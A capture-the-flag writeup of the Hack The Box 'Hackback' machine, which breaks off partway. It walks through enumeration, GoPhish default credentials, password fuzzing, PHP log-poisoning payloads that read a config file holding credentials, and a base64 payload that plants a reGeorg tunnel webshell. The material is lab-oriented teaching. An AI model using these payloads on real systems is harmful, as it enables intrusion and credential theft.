---
layout: post
title: "Hack The Box: 'Hackback' Writeup"
image: ""
date: 2020-04-10 00:04:07
tags:
  - hackthebox
  - windows
  - javascript-deobfuscation
  - command-injection
  - DCOM
  - manual-exploit
  - apsx-tunneling
  - log-poisoning
  - powershell
description: ""
categories:
  - Hack The Box
---

<style>

#myBtn {
  display: none;
  position: fixed;
  bottom: 40px;
  right: 50px;
  z-index: 99;
  font-size: 12px;
  border: 1px solid black;
  outline: black;
  background-color: #262626;
  color: white;
  cursor: pointer;
  padding: 10px 22px 10px 22px;
  border-radius: 10px;
  font-family: 'Open Sans';
}

#myBtn:hover {
  background-color: #5d4d7a;
}

applause-button {
		margin: auto;
	}

	.header-site .site-title {
      	padding-top: 5px;
      	color: white;
      	text-align: center;
      	font-weight: bold;
      	padding-left: 19px;
	}
	
	.hackback-img {
		max-width: 100%;
	}

	.post-content img { 
		margin: 1.875rem auto;
		display: block;
	}
</style>

<button onclick="topFunction()" id="myBtn" title="Go to top">↑</button>

<script>
// When the user scrolls down 20px from the top of the document, show the button
window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("myBtn").style.display = "block";
  } else {
    document.getElementById("myBtn").style.display = "none";
  }
}

// When the user clicks on the button, scroll to the top of the document
function topFunction() {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
}
</script>

<!-- add the button style & script -->
<link rel="stylesheet" href="/assets/css/applause-button.css" />
<script src="/assets/js/applause-button.js"></script>

<img src="/assets/img/writeups/HTB-HACKBACK/HTB-HACKBACK-BADGE.PNG" class="hackback-img" alt="Hack The Box - Hackback">

### Preface

If you find anything in this writeup you feel is inaccurately depicted and/or explained, please reach out to me and let me know! `Hackback` is currently rated as the most difficult machine on the website <a href="https://www.hackthebox.eu/">Hack The Box</a>. It includes some interesting techniques such as log poisoning, SOCKS proxy tunneling and alternate data streams!

<p><br></p>

### Overview

The `Hackback` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/1391">decoder</a> and <a href="https://www.hackthebox.eu/home/users/profile/12438">yuntao</a>) is a retired 50 point Windows machine. This machine is incredibly difficult; so difficult that it maintained a 9.4/10 difficulty rating for almost a week upon being released. The initial steps involve locating a GoPhish website where default credentials are used to log in. There are also some virtual hosts which lead to a hidden administration link within obfuscated JavaScript code. Next, the parameters of a web admin page can be fuzzed to determine its log files are SHA-256 checksums of connecting IP addresses. Log poisoning is then performed to gain read/write access. A file called `web.config.old` is extracted from the web server and contains credentials for the user `simple`. A reGeorg ASPX tunnel is then utilized to connect to the remote machine. This enables tunneling via a SOCKS proxy with WinRM and the credentials found for `simple` in `web.config.old`. A command injection vulnerability in a powershell script called `dellog.ps1` can be leveraged in association with `dellog.bat` and `clean.ini` files to escalate to the user `hacker`. Once escalated, the user `hacker` can start/stop a suspicious service called `UserLogger`, which accepts an argument. This can be abused to escalate folder path permissions. Finally, `root.txt` can be viewed by reading an alternate data stream (ADS).

<p><br></p>

_deep breath_

<p><br></p>
To start, let's perform an initial `nmap` scan for general port discovery and service enumeration.
<p><br></p>

### Nmap Scan

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
➜  HACKBACK cat nmap/Full_10.10.10.128.nmap
# Nmap 7.70 scan initiated Wed Jun 26 18:41:47 2019 as: nmap -p- -Pn -sCV -oN nmap/Full_Scan.nmap 10.10.10.128
Nmap scan report for hackback.htb (10.10.10.128)
Host is up (0.082s latency).

PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|_ Potentially risky methods: TRACE
|\_http-server-header: Microsoft-IIS/10.0
|\_http-title: IIS Windows Server
6666/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-server-header: Microsoft-HTTPAPI/2.0
|\_http-title: Site doesn't have a title.
64831/tcp open ssl/unknown
| fingerprint-strings:
| FourOhFourRequest:
| HTTP/1.0 404 Not Found
| Content-Type: text/plain; charset=utf-8
| Set-Cookie: \_gorilla_csrf=MTU2MTYxNDA0MHxJbmhYYWtwMFRDODFiVEprV2xKVlZuUldNME5sZUhGaU4ySTNNVzRyYVhOdU5uVlpaR3N2VVV0SFJWVTlJZ289fIsEWDUNIsfBkhOODEW4L0oYhWhQiD3ICcQhMBf0PS-q; HttpOnly; Secure
| Vary: Accept-Encoding
| Vary: Cookie
| X-Content-Type-Options: nosniff
| Date: Thu, 27 Jun 2019 05:40:40 GMT
| Content-Length: 19
| page not found
| GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq:
| HTTP/1.1 400 Bad Request
| Content-Type: text/plain; charset=utf-8
| Connection: close
| Request
| GetRequest:
| HTTP/1.0 302 Found
| Content-Type: text/html; charset=utf-8
| Location: /login?next=%2F
| Set-Cookie: \_gorilla_csrf=MTU2MTYxNDAxMnxJa3cyYmxCelpETjFOa1pNUldoQ2NYaEthV3BHYkdsaVJIQnhkbmR3TVM5NmVHUmhVQ3NyYUVGemJVMDlJZ289fKUowzV0RRkNbELD00_5x7uTSyDte6KzWnCGJXT9t5WI; HttpOnly; Secure
| Vary: Accept-Encoding
| Vary: Cookie
| Date: Thu, 27 Jun 2019 05:40:12 GMT
| Content-Length: 38
| href="/login?next=%2F">Found</a>.
| HTTPOptions:
| HTTP/1.0 302 Found
| Location: /login?next=%2F
| Set-Cookie: \_gorilla_csrf=MTU2MTYxNDAxMnxJakIwVjFaVlpFcFRjQ3RsYlhsRWN5OHdXak5aTXpaeWFXOVpaRUUwVDJRNFptdHZabkZCVUN0b2QwVTlJZ289fBPuJzUomVC9beg6yLA8C9i23sXvZr_EQsMiLoCnbQRM; HttpOnly; Secure
| Vary: Accept-Encoding
| Vary: Cookie
| Date: Thu, 27 Jun 2019 05:40:12 GMT
|_ Content-Length: 0
| ssl-cert: Subject: organizationName=Gophish
| Not valid before: 2018-11-22T03:49:52
|\_Not valid after: 2028-11-19T03:49:52
</code></pre></div></div>

### Enumerating Port 80

At this stage, let's additionally add `hackback.htb` to our `/etc/hosts` file. The first thing we notice upon browsing to the web page on port 80 (IIS 10.0) is a picture of a donkey...

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-WP-DONKEY.PNG" class="hackback-img" alt="Hackback - Front Page Donkey">

Let's go ahead and run a `gobuster` scan as well.

```bash
➜  gobuster gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://hackback.htb -x php,aspx,txt,ini,png,jpg
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://hackback.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg,php,aspx,txt,ini,png
[+] Timeout:        10s
===============================================================
2020/04/15 14:31:15 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
/. (Status: 200)
```

Hmph... Nothing here so far.

### Enumerating Port 6666

Moving on, let's check out port 6666. It appears to be running Microsoft HTTPAPI 2.0, so let's run `gobuster` again to see if we can find anything worth digger deeper into.

```bash
➜  HACKBACK gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://hackback.htb:6666/ -x php,aspx,txt,ini,png,jpg
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://hackback.htb:6666/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     ini,png,jpg,php,aspx,txt
[+] Timeout:        10s
===============================================================
2020/04/15 14:37:01 Starting gobuster
===============================================================
/help (Status: 200)
```

Nice! We discovered a directory called `/help`. Let's take a look at it with `curl`.

```bash
➜  HACKBACK curl -X GET http://10.10.10.128:6666/help
"hello,proc,whoami,list,info,services,netsat,ipconfig"
```

It looks like there are some commands here. Let's try one!

```bash
➜  HACKBACK curl -X GET http://10.10.10.128:6666/hello
"hello donkey!"
```

Unfortunately, none of the commands appeared to be useful after checking each one individually. Attempting to perform different injection attacks also didn't appear to work, so let's continue our process of enumerating.

### Enumerating Port 64831

Perusing port 64831 enables us to quickly discover a GoPhish login page over HTTPS. Let's go ahead and check the SSL certificate first to make sure there isn't any additional helpful information there.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GOPHISH-SSL.PNG" class="hackback-img" alt="Hackback - GoPhish SSL Certificate">

Doesn't look like we can find anything this time, but it's always a good idea to check just to be sure.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GOPHISH-LOGIN.PNG" class="hackback-img" alt="Hackback - GoPhish Login">

I started off simple and looked up the default credentials for a GoPhish `admin` account. A brief Google search did the trick.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-ADMIN-CREDS.PNG" class="hackback-img" alt="Hackback - GoPhish Login Credential Search">

Awesome, the credentials are `admin:gophish`. We might as well give them a try.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-LOGIN-ADMIN.PNG" class="hackback-img" alt="Hackback - GoPhish Admin Login">

Great! The credentials we found work.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-DASH.PNG" class="hackback-img" alt="Hackback - GoPhish Admin Dashboard">

After doing some browsing, we also discover the `Email Templates` panel which contains quite a few different pre-configured templates.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-EMAIL-TEMPLATES.PNG" class="hackback-img" alt="Hackback - GoPhish Email Templates">

The `Admin` template appears to contain information for the `admin` sub domain at `admin.hackback.htb`. We should add `admin.hackback.htb` to our `/etc/hosts` file at this point so the DNS entry resolves properly. We can additionally observe the `HackTheBox` template containing the URL `www.hackthebox.htb`, so let's add that to our `/etc/hosts` file as well.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-ADMIN-TEMPLATE.PNG" class="hackback-img" alt="Hackback - GoPhish Admin Template">

### Enumerating the Admin Sub Domain

Taking a peak at `admin.hackback.htb`, we are directed to some sort of login page.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-ADMIN-SD.PNG" class="hackback-img" alt="Hackback - Admin Sub Domain Login">

Viewing the page's source, an interesting comment appears to have been left in the HTML.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-JS-NOTE.PNG" class="hackback-img" alt="Hackback - JavaScript Comment ">

However, after checking `admin.hackback.htb/js/.js`, we're met with a 404 error response page.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-JS-ERROR.PNG" class="hackback-img" alt="Hackback - GoPhish JavaScript File Error">

Let's fire up another `gobuster` scan and specify `.js` as the only extension.

```bash
➜  HACKBACK gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://admin.hackback.htb/js/ -x js
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://admin.hackback.htb/js/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     js
[+] Timeout:        10s
===============================================================
2020/04/15 15:06:04 Starting gobuster
===============================================================
/private.js (Status: 200)
```

Rad. We immediately get a hit on `private.js`!
<p><br></p>

### Analyzing the private.js File

Examining the source, it appears to be a bunch of obfuscated JavaScript...

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-PRIVATEJS.PNG" class="hackback-img" alt="Hackback - private.js file">

If we examine the `private.js` file further, we'll find it is actually encoded with ROT13. We can determine this by noticing the first line:

```javascript
ine n =
``` 
Which can be attributed to being:
```javascript
var a =
```
We also have to decipher the remainder of the code with a `Caesar cipher` variation. This was the output once everything is decoded and beautified:
```javascript
var a = [
  'WxIjwr7DusO8GsKvRwB+wq3DuMKrwrLDgcOiwrY1KEEgG8KCwq7Dl8K3',
  'AcOMwqvDqQgCw4/Ct2nDtMKhZcKDwqTCpTsyw7nChsOQXMO5W8KpDsOtNCDDvAjCgyk=',
  'w5HDr8O7dDRmMMKJw4jDlVRnwrt7w7s0wo1aw7sAQsKsfsOEw4XDsRjClMOwFzrCmzpvCAjCuBzDssK9F8O4wqZnWsKh'
];
(function (c, d) {
  var e = function (f) {
    while (--f) {
      c['push'](c['shift']());
    }
  };
  e(++d);
}(a, 102));
var b = function (c, d) {
  c = c - 0;
  var e = a[c];
  if (b['MsULmv'] === undefined) {
    (function () {
      var f;
      try {
        var g = Function('return (function() ' + '{}.constructor("return this")( )' + ');');
        f = g();
      } catch (h) {
        f = window;
      }
      var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
      f['atob'] || (f['atob'] = function (j) {
        var k = String(j) ['replace'](/=+$/, '');
        for (var l = 0, m, n, o = 0, p = ''; n = k['charAt'](o++); ~n && (m = l % 4 ? m * 64 + n : n, l++ % 4) ? p += String['fromCharCode'](255 & m >> ( - 2 * l & 6))  : 0) {
          n = i['indexOf'](n);
        }
        return p;
      });
    }());
    var q = function (r, d) {
      var t = [
      ],
      u = 0,
      v,
      w = '',
      x = '';
      r = atob(r);
      for (var y = 0, z = r['length']; y < z; y++) {
        x += '%' + ('00' + r['charCodeAt'](y) ['toString'](16)) ['slice']( - 2);
      }
      r = decodeURIComponent(x);
      for (var A = 0; A < 256; A++) {
        t[A] = A;
      }
      for (A = 0; A < 256; A++) {
        u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 256;
        v = t[A];
        t[A] = t[u];
        t[u] = v;
      }
      A = 0;
      u = 0;
      for (var B = 0; B < r['length']; B++) {
        A = (A + 1) % 256;
        u = (u + t[A]) % 256;
        v = t[A];
        t[A] = t[u];
        t[u] = v;
        w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 256]);
      }
      return w;
    };
    b['OoACcd'] = q;
    b['qSLwGk'] = {
    };
    b['MsULmv'] = !![];
  }
  var C = b['qSLwGk'][c];
  if (C === undefined) {
    if (b['pIjlQB'] === undefined) {
      b['pIjlQB'] = !![];
    }
    e = b['OoACcd'](e, d);
    b['qSLwGk'][c] = e;
  } else {
    e = C;
  }
  return e;
};
var x = 'Secure Login Bypass';
var z = b('0x0', 'P]S6');
var h = b('0x1', 'r7TY');
var y = b('0x2', 'DAqg');
var t = '?action=(show,list,exec,init)';
var s = '&site=(twitter,paypal,facebook,hackthebox)';
var i = '&password=********';
var k = '&session=';
var w = 'Nothing more to say';
```
Now that we have the full output, let's try to run the `private.js` file and extract the variable contents with `node`.

```javascript
> x
'Secure Login Bypass'
> z
'Remember the secret path is'
> h
'2bb6916122f1da34dcd916421e531578'
> y
'Just in case I loose access to the admin panel'
> t
'?action=(show,list,exec,init)'
> s
'&site=(twitter,paypal,facebook,hackthebox)'
> i
'&password=********'
> k
'&session='
> w
'Nothing more to say'
```
Perfect, this is exactly what we wanted. It appears there's a secret path at `/2bb6916122f1da34dcd916421e531578`. However, we don't appear to be able to locate anything when checking the URL directly.

```bash
➜  HACKBACK curl -X GET http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578
<head><title>Document Moved</title></head>
<body><h1>Object Moved</h1>This document may be found <a HREF="http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/">here</a></body>
```
As a result of this, let's fuzz the endpoint for additional files.

```bash
➜  HACKBACK wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt --hc 404 -t 15 http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ
Total requests: 16243

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                     
===================================================================

000000061:   200        8 L      13 W     132 Ch      "index.html"                                                                                                                                
000000366:   200        8 L      13 W     132 Ch      "."
```
It doesn't look like we're going to be getting anywhere quick doing that though... Let's take a step back and try to think smarter instead of harder. We recall the `private.js` file contains lists of `actions` and `sites` for variables `t` and `s`:

```javascript
var t = '?action=(show,list,exec,init)';
var s = '&site=(twitter,paypal,facebook,hackthebox)';
```

### Sub Domain Parameter Fuzzing

With this in mind, let's try building two wordlists with the contents of these variables.
 
```bash
➜  HACKBACK cat actions.txt; echo -n '--\n';  cat sites.txt
show
list
exec
init
--
twitter
paypal
facebook
hackthebox
```

Now, let's test out `wfuzz` again with the aforementioned wordlists and parameters.

```bash
➜  HACKBACK wfuzz -w actions.txt -w sites.txt --hc 404 "http://admin.hackback.htb/?action=FUZZ&site=FUZZ"

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://admin.hackback.htb/?action=FUZZ&site=FUZ2Z&password=&session=
Total requests: 16

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                     
===================================================================

000000004:   200        27 L     66 W     825 Ch      "show - hackthebox"                                                                                                                         
000000002:   200        27 L     66 W     825 Ch      "show - paypal"                                                                                                                             
000000001:   200        27 L     66 W     825 Ch      "show - twitter"                                                                                                                            
000000005:   200        27 L     66 W     825 Ch      "list - twitter"                                                                                                                            
000000011:   200        27 L     66 W     825 Ch      "exec - facebook"                                                                                                                           
000000012:   200        27 L     66 W     825 Ch      "exec - hackthebox"                                                                                                                         
000000014:   200        27 L     66 W     825 Ch      "init - paypal"                                                                                                                             
000000003:   200        27 L     66 W     825 Ch      "show - facebook"                                                                                                                           
000000013:   200        27 L     66 W     825 Ch      "init - twitter"                                                                                                                            
000000008:   200        27 L     66 W     825 Ch      "list - hackthebox"                                                                                                                         
000000009:   200        27 L     66 W     825 Ch      "exec - twitter"                                                                                                                            
000000007:   200        27 L     66 W     825 Ch      "list - facebook"                                                                                                                           
000000010:   200        27 L     66 W     825 Ch      "exec - paypal"                                                                                                                             
000000006:   200        27 L     66 W     825 Ch      "list - paypal"                                                                                                                             
000000015:   200        27 L     66 W     825 Ch      "init - facebook"                                                                                                                           
000000016:   200        27 L     66 W     825 Ch      "init - hackthebox"                                                                                                                         

Total time: 0.321124
Processed Requests: 16
Filtered Requests: 0
Requests/sec.: 49.82486
```
This returned all viable `sites` and `actions` for us! We can obtain the password for the `hackthebox` site shortly after using `wfuzz` as well.

```bash
➜  HACKBACK wfuzz -w /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-10.txt "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=FUZZ"

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=FUZZ
Total requests: 92

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                     
===================================================================

000000008:   302        6 L      12 W     117 Ch      "12345678" 
```

The password appears to be `12345678`. Let's run `curl` against the endpoint using that password and the `hackthebox` site specified.

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=12345678'
Array
(
    [0] => .
    [1] => ..
    [2] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```
Well this is interesting. There appears to be a `.log` file with a hashed name. Let's use `hash-identifier` to determine what type of hash it is.

```bash
➜  HACKBACK hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7

Possible Hashs:
[+] SHA-256
```
SHA-256 is apparently the most likely. We are able to log in to the `www.hackthebox.htb` site we found earlier in the HackTheBox template. The URL from the `HackTheBox` email template also generates a second `.log` file with a SHA-256 hash of our IP address as its name.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-HTB-LOGIN.PNG" class="hackback-img" alt="Hackback - Hack The Box Login">

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=12345678'
Array
(
    [0] => .
    [1] => ..
    [2] => 972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b.log
    [3] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```
We can verify the hash of the new log file by checking the SHA-256 sum of our IP address.`972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b`
<p><br></p>

### Log Poisoning Discovery & Enumeration

Equipped with our new session ID, we can try to utilize the `action=show` parameter to view the contents of the log file.

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:07:44 PM] 10.10.14.37 - Username: farbs@hackback.htb, Password: ilovehacking!
```
Upon doing so, we discover the log file contains `POST` parameters that are sent to `www.hackthebox.htb`. This is interesting, as it can lead us to assume we can perform a log poisoning attack if we inject PHP code into the `.log` file for our IP address. Let's enter a PHP payload into both the `username` and `password` fields of the fake Hack The Box login page. Then, we'll check the `.log` file afterwards for evidence of code injection.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-HTB-LOGIN-INJECTION.PNG" class="hackback-img" alt="Hackback - HTB Login PHP Injection">

Once we check the `.log` file afterwards...

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:07:44 PM] 10.10.14.37 - Username: farbs@hackback.htb, Password: ilovehacking!
[15 April 2020, 08:15:27 PM] 10.10.14.37 - Username: Farbs was here!, Password: Farbs was here!
```
The PHP appears to have ran successfully! However, this is where everything starts to get a bit hairy... We will ultimately struggle to get any kind of shell back using `shell_exec, exec`, etc. and we can't even run `phpinfo`. With this in mind, we're still able to list directories, as well as utilize php wrapper syntax such as `base64_encode(file_get_contents())`.
<p><br></p>
Running `scandir` proves to be quite useful though, as we are still able to view directory contents.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-SCANDIR-C1.PNG" class="hackback-img" alt="Hackback - HTB Login scandir() Initial Directory">

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:07:44 PM] 10.10.14.37 - Username: farbs@hackback.htb, Password: ilovehacking!
[15 April 2020, 08:15:27 PM] 10.10.14.37 - Username: Farbs was here!, Password: Farbs was here![15 April 2020, 08:27:02 PM] 10.10.14.37 - Username: Array
(
    [0] => .
    [1] => ..
    [2] => index.html
    [3] => webadmin.php
)
, Password: // this is just a comment
```
After doing a bit of traversing, we discover a `web.config.old` file located in `/inetpub/wwwroot/new_phish/admin`.

```
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:40:57 PM] 10.10.14.37 - Username: Array
(
    [0] => .
    [1] => ..
    [2] => 2bb6916122f1da34dcd916421e531578
    [3] => App_Data
    [4] => aspnet_client
    [5] => css
    [6] => img
    [7] => index.php
    [8] => js
    [9] => logs
    [10] => web.config
    [11] => web.config.old
)
, Password: // farbs was here again!
```
The file appears to contain some credentials.

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:43:31 PM] 10.10.14.37 - Username: <?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <authentication mode="Windows">
        <identity impersonate="true"                 
            userName="simple" 
            password="ZonoProprioZomaro:-("/>
     </authentication>
        <directoryBrowse enabled="false" showFlags="None" />
    </system.webServer>
</configuration>
, Password: // one more comment for fun!
```

We are able to obtain the file by submitting the following PHP:

```php
<?php echo(file_get_contents('/inetpub/wwwroot/new_phish/admin/web.config.old')); ?>
```
However, we don't appear to be able to use the credentials yet. At this point we can probably assume they'll come in handy eventually, though.

### Tunneling with reGeorg

Armed with the ability to write files to the system via PHP log poisoning, and considering we still don't have access to any `shell_exec` or `exec` functions in general, let's utilize <a href="https://github.com/sensepost/reGeorg">reGeorg</a> for pivoting. This tool enables us to create a local SOCKS proxy bound to a remote `.aspx` file running on the target machine.
<p><br></p>

To get `reGeorg` running, we first need to upload the `tunnel.aspx` file that can be found in the `reGeorg` GitHub repository. Let's use a simple `file_put_contents()` command with the PHP injection to do this.
<p><br></p>

Here's an example of our final PHP payload for sending the `tunnel.aspx` file. The base64 included is the contents of the `tunnel.aspx` file piped to `base64`:

```bash
<?php file_put_contents("tunnel.aspx",base64_decode("PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN